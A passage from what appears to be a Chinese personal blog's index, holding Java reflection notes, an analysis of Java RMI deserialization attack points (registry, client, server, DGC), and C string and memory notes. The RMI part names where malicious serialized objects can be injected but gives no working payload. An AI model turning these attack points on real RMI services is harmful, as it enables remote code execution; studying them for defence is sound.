punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"Test03"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>classLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//测试JDK内部的类是谁加载的</span>        classLoader <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Object"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>classLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//获取系统类加载器可以加载的路径</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"java.class.path"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="获取类运行结构"><a href="#获取类运行结构" class="headerlink" title="获取类运行结构"></a>获取类运行结构</h2><p><code>getDeclaredField</code>获取属性，<code>getDeclaredMethod</code>获取方法,<code>getDeclaredConstructors</code>获取所有构造器.<code>getDeclaredConstructor()</code>获取指定构造器。加s获取所有，不加s指定。</p><p><strong>获取构造器</strong></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> aClass <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"example.com.Person2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Constructor</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span><span class="token punctuation">[</span><span class="token punctuation">]</span> declaredConstructors <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">getDeclaredConstructors</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Constructor</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> declaredConstructor <span class="token operator">:</span> declaredConstructors<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>declaredConstructor<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">Constructor</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> declaredConstructor <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="动态创建对象执行方法"><a href="#动态创建对象执行方法" class="headerlink" title="动态创建对象执行方法"></a>动态创建对象执行方法</h2><p><strong>操作构造器</strong></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">//创建对象</span><span class="token class-name">Object</span> o <span class="token operator">=</span> c1<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//本质调用类的无参构造器</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Constructor</span> constructor <span class="token operator">=</span> c1<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Object</span> o1 <span class="token operator">=</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token string">"Admin"</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>o1<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><strong>操作方法</strong></p><p><code>invoke</code>:激活 (实例对象,方法的值)</p><p><code>newInstance</code>本质调用类的无参构造器.与new类似,new可以传参<code>newInstance</code>不行</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span> c1 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"example.com.Person2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Person2</span> person2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Person2</span><span class="token punctuation">)</span> c1<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Method</span> admin <span class="token operator">=</span> c1<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"Admin"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>admin<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>admin<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>person2<span class="token punctuation">,</span><span class="token string">"管理员"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><strong>操作属性</strong></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span> c1 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"example.com.Person2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Person2</span> person2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Person2</span><span class="token punctuation">)</span> c1<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Field</span> admin <span class="token operator">=</span> c1<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"age"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>admin<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>admin<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>person2<span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>person2<span class="token punctuation">.</span><span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RMI漏洞分析</title>
      <link href="/2024/11/11/2024-11-2-RMI%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2024/11/11/2024-11-2-RMI%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p><img src="/%5Cimages%5Cposts%5CRMI%5C1730545149754.jpg"></p><h2 id="创建远程服务"><a href="#创建远程服务" class="headerlink" title="创建远程服务"></a>创建远程服务</h2><p>创建远程服务这一块是不存在漏洞的。</p><p>过程就是发布远程对象，<code>exportObject()</code> 指定到发布的 IP 与端口，端口的话是一个随机值。至始至终复杂的地方其实都是在赋值，创建类，进行各种各样的封装</p><h2 id="创建注册中心和绑定"><a href="#创建注册中心和绑定" class="headerlink" title="创建注册中心和绑定"></a>创建注册中心和绑定</h2><p>创建注册中心与服务端是独立的，谁先谁后无所谓</p><p>就是对比创建远程对象，多了一个持久的对象，这个持久的对象是注册中心</p><h3 id="绑定"><a href="#绑定" class="headerlink" title="绑定"></a>绑定</h3><pre class="language-none"><code class="language-none">bindings.put(name, obj);</code></pre><p>把Client端IP，端口put进去。实际绑的也是Stub</p><h2 id="客户端请求注册中心-客户端"><a href="#客户端请求注册中心-客户端" class="headerlink" title="客户端请求注册中心-客户端"></a>客户端请求注册中心-客户端</h2><h3 id="获取注册中心"><a href="#获取注册中心" class="headerlink" title="获取注册中心"></a>获取注册中心</h3><p>不存在漏洞点</p><p>新建了一个 Ref，然后把该封装的都封装到 Ref 里面进去</p><p><img src="/%5Cimages%5Cposts%5CRMI%5Cimage-20241101210041711.png"></p><p>这里没有用序列化进行传递，只传了参数然后Client端本地创建</p><h3 id="查找远程对象"><a href="#查找远程对象" class="headerlink" title="查找远程对象"></a>查找远程对象</h3><p>存在漏洞点</p><pre class="language-none"><code class="language-none">RemoteObj remoteObj &#x3D; (RemoteObj) registry.lookup(&quot;remoteObj&quot;);</code></pre><p><img src="/%5Cimages%5Cposts%5CRMI%5Cimage-20241101213021393.png"></p><p>这里直接将传入的字符串<code>remoteObj</code>作为序列化数据传进去。注册中心会通过反序列化读取，注册中心这里就会存在一个漏洞点</p><p>下面调用了<code>invoke</code>方法，super 就是<code>UnicastRef</code> 这个类.<code>invoke</code>里面调用<code>executeCall</code>。<code>executeCall</code>是处理网络请求的方法，客户端的网络请求都是通过这个方法实现的。</p><p><img src="/%5Cimages%5Cposts%5CRMI%5C1730475115042.jpg"></p><p>下面有个错误会进行反序列化</p><p><img src="/%5Cimages%5Cposts%5CRMI%5Cimage-20241101233051996.png"></p><p>in 就是数据流里面的东西。所以如果注册中心返回一个恶意的对象，客户端进行反序列化，这就会导致反序列化漏洞,而调用<code>invoke</code>就会导致该漏洞。</p><p><img src="/%5Cimages%5Cposts%5CRMI%5Cimage-20241101235240189.png"></p><p>下面也直接将返回值进行了反序列化，这个<code>var23</code>就是读取到的动态代理</p><p><img src="/%5Cimages%5Cposts%5CRMI%5Cimage-20241101234943702.png"></p><p>最后获取到的动态代理</p><p><img src="/%5Cimages%5Cposts%5CRMI%5Cimage-20241101233639057.png"></p><h2 id="客户端请求服务端-客户端"><a href="#客户端请求服务端-客户端" class="headerlink" title="客户端请求服务端-客户端"></a>客户端请求服务端-客户端</h2><pre class="language-none"><code class="language-none">remoteObj.sayHello(&quot;hello&quot;); </code></pre><p><img src="/%5Cimages%5Cposts%5CRMI%5Cimage-20241102152846415.png"></p><p>这里调用重载的<code>invoke</code>方法。跟进<code>invoke</code>方法里面的<code>marshalValue</code></p><p><img src="/%5Cimages%5Cposts%5CRMI%5Cimage-20241102153057301.png"></p><p>判断是不是基础类型，不是就序列化进去</p><p><img src="/%5Cimages%5Cposts%5CRMI%5Cimage-20241102153234165.png"></p><p>后面调用了<code>call.executeCall();</code>，先前客户端调用注册中心的时候这里就有这个危险方法，也就是说RMI进行网络处理请求就会执行到这个危险方法。</p><p>后面的<code>unmarshalValue</code>方法里面会进行反序列化,把数据读回来</p><p><img src="/%5Cimages%5Cposts%5CRMI%5Cimage-20241102153520878.png"></p><p><img src="/%5Cimages%5Cposts%5CRMI%5Cimage-20241102153632760.png"></p><p>所以这里服务端打客户端就有两个点。一个是 <code>call.executeCall()</code>，另一个点是 <code>unmarshalValueSee</code></p><p><code>executeCall</code>处理的协议就是JRMP协议，攻击Stub</p><p>在客户端上发生的代码， 总结就是</p><p><img src="/%5Cimages%5Cposts%5CRMI%5Cimage-20241102162057028.png"></p><h2 id="客户端请求注册中心-注册中心"><a href="#客户端请求注册中心-注册中心" class="headerlink" title="客户端请求注册中心-注册中心"></a>客户端请求注册中心-注册中心</h2><p>服务端操作Skel，封装数据到Tatget里面，这里在Targe打断点</p><p><img src="/%5Cimages%5Cposts%5CRMI%5Cimage-20241102171052495.png"></p><p>最后从<code>disp.dispatch(impl, call)</code>—&gt;<code>oldDispatch(obj, call, num)</code>–&gt;<code>skel.dispatch(obj, call, op, hash);</code>，<code>skel.dispatch</code>这里就是漏洞点，也是客户端打注册中心的攻击方式</p><p><img src="/%5Cimages%5Cposts%5CRMI%5Cimage-20241102173149202.png"></p><p>这里许多<code>case</code>，除了case0的list都能进行反序列化</p><p>这里注册中心处理 Target，进行 Skel 的生成与处理。漏洞点是<code>skel.dispatch()</code>，可以结合CC链进行攻击。</p><h2 id="客户端请求注册中心-服务端"><a href="#客户端请求注册中心-服务端" class="headerlink" title="客户端请求注册中心-服务端"></a>客户端请求注册中心-服务端</h2><p>跟之前一样，F9两次出现有动态代理的stub为止，进入</p><p><code>disp.dispatch(impl, call)</code>–&gt;<code>unmarshalValue(types[i], in)</code></p><p>这里和之前一样，存在反序列化</p><p><img src="/%5Cimages%5Cposts%5CRMI%5Cimage-20241102180756135.png"></p><p>这里就是客户端传过来的值</p><p><img src="/%5Cimages%5Cposts%5CRMI%5Cimage-20241102180033276.png"></p><h2 id="DGC"><a href="#DGC" class="headerlink" title="DGC"></a>DGC</h2><p>直接看漏洞点</p><p>DGC服务端<code>DGCImpl_Skel</code>的<code>dispatch</code>和DGC客户端<code>DGCImpl_Stub</code>下的<code>dirty</code>都有反序列化点</p><p><img src="/%5Cimages%5Cposts%5CRMI%5Cimage-20241102185421048.png"></p><p><img src="/%5Cimages%5Cposts%5CRMI%5Cimage-20241102185457134.png"></p><p>DGC是自动创建的一个过程，用于清理内存。攻击远程对象需要知道参数类型，攻击DGC就不需要</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://drun1baby.github.io/2022/07/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9801-RMI%E5%9F%BA%E7%A1%80/">https://drun1baby.github.io/2022/07/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9801-RMI%E5%9F%BA%E7%A1%80/</a></p><p><a href="https://www.bilibili.com/video/BV1L3411a7ax?vd_source=3e2cfb0d1ade988f38af8725accb9ef7">https://www.bilibili.com/video/BV1L3411a7ax?vd_source=3e2cfb0d1ade988f38af8725accb9ef7</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C/C++学习</title>
      <link href="/2024/11/11/2024-10-31-C,C++%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/11/11/2024-10-31-C,C++%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="C语言"><a href="#C语言" class="headerlink" title="C语言"></a>C语言</h1><h2 id="头文件"><a href="#头文件" class="headerlink" title="头文件"></a>头文件</h2><p>声明一般设置在头文件</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span>  <span class="token expression">包含系统头文件</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"main.h"</span>  <span class="token expression">本目录下寻找头文件</span></span>先在本目录下寻找，在去系统寻找</code></pre><h2 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">void</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">*</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span><span class="token keyword">int</span> y <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>x<span class="token punctuation">,</span> <span class="token operator">&amp;</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//输出11</span>    <span class="token comment">//x的内存地址也是0x008FFE3C  </span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">*</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> temp <span class="token operator">=</span> <span class="token operator">*</span>a <span class="token operator">+</span> <span class="token operator">*</span>b<span class="token punctuation">;</span><span class="token operator">*</span>a <span class="token operator">=</span> temp<span class="token punctuation">;</span><span class="token comment">//a的内存地址0x008FFE3C</span><span class="token punctuation">&#125;</span></code></pre><p><img src="/%5Cimages%5Cposts%5CC%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%5Cimage-20241008222545892.png"></p><p><img src="/%5Cimages%5Cposts%5CC%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%5Cimage-20241008222625100.png"></p><p>内存地址修改，X输出11</p><p>操作数组</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> Number<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span><span class="token operator">*</span> p <span class="token operator">=</span> Number<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//printf("%d\n", *(p + i));   //输出0-9</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span> p<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//输出0-9</span><span class="token comment">//Number地址：0x009AF750</span><span class="token comment">//p地址也是0x009AF750</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>p加i每次加一个类型长度,int32位，加1就加32位</p><p><img src="/%5Cimages%5Cposts%5CC%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%5Cimage-20241008223325245.png"></p><p>这里断点调试Number和P的地址都一样，Number就等同于p</p><h2 id="字符串函数"><a href="#字符串函数" class="headerlink" title="字符串函数"></a>字符串函数</h2><p><code>puts</code>字符串输出</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span><span class="token operator">*</span> szStr <span class="token operator">=</span> <span class="token string">"This is Admin"</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span>szStr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//puts自带换行</span></code></pre><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span> szArr<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token string">"Admin"</span><span class="token punctuation">,</span><span class="token string">"Admin123"</span><span class="token punctuation">,</span><span class="token string">"Admin666"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span>szArr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><code>strlen</code>计算字符串长度，只算有效字符</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> szStr2<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"This is root"</span><span class="token punctuation">;</span><span class="token keyword">char</span> szStr3<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"This is Hash"</span><span class="token punctuation">;</span><span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>szStr2<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//输出12</span></code></pre><p><code>strcat</code>拼接字符串,<code>strncat</code>防止溢出,可指定拼接字符个数.将第二个参数拼接在第一个后面</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> szStr2<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"This is root"</span><span class="token punctuation">;</span><span class="token keyword">char</span> szStr3<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"This is Hash"</span><span class="token punctuation">;</span><span class="token function">strcat</span><span class="token punctuation">(</span>szStr2<span class="token punctuation">,</span> szStr3<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//可能造成溢出  </span><span class="token function">strncat</span><span class="token punctuation">(</span>szStr2<span class="token punctuation">,</span> szStr3<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//拼接两个字符</span><span class="token function">puts</span><span class="token punctuation">(</span>szStr2<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><code>sprintf</code>也可拼接字符串,可防止溢出</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> szStr5<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token function">sprintf</span><span class="token punctuation">(</span>szStr5<span class="token punctuation">,</span><span class="token string">"dada%s%s%s"</span><span class="token punctuation">,</span> szStr2<span class="token punctuation">,</span> szStr3<span class="token punctuation">,</span> szStr4<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span>szStr5<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><code>strcmp</code>和<code>strncmp</code>比较相等.这里的比较是将两个字符串全部转换成Ascii，第一个减第二个，大于返回正数，小于返回负数，相等返回0.<code>strncmp</code>可只比较指定字符</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> szStr2<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"This is root"</span><span class="token punctuation">;</span><span class="token keyword">char</span> szStr3<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"This is Hash"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strncmp</span><span class="token punctuation">(</span>szStr2<span class="token punctuation">,</span> szStr3<span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"不等于"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"等于"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//只比较前五个字符,等于</span><span class="token punctuation">&#125;</span></code></pre><p><code>strcpy</code>拷贝函数,<code>strncpy</code>指定拷贝字符个数,也是防止溢出</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> szStr4<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>   <span class="token comment">//初始化成0,否则会乱码</span><span class="token function">strcpy</span><span class="token punctuation">(</span>szStr4<span class="token punctuation">,</span> <span class="token string">"adadad"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//拷贝函数</span><span class="token function">strncpy</span><span class="token punctuation">(</span>szStr4<span class="token punctuation">,</span> <span class="token string">"adadad"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//拷贝一个字符</span><span class="token function">puts</span><span class="token punctuation">(</span>szStr4<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h2><p>C语言可以申请内存</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span><span class="token operator">*</span> szStr<span class="token punctuation">;</span>szStr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">50</span> <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//申请内存宽度  char是一个字节，int类型是四个</span><span class="token function">memset</span><span class="token punctuation">(</span>szStr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">50</span> <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//初始化为0</span><span class="token function">free</span><span class="token punctuation">(</span>szStr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//释放内存</span></code></pre><p><img src="/%5Cimages%5Cposts%5CC%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%5Cimage-20241009105158704.png"></p><p>内存中是50个字节</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> szChar<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"This is Admin"</span><span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span> szChar1<span class="token punctuation">;</span><span class="token keyword">int</span> length <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span>szChar<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//实际内存加一，后面还有个\0</span>szChar1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>length <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token 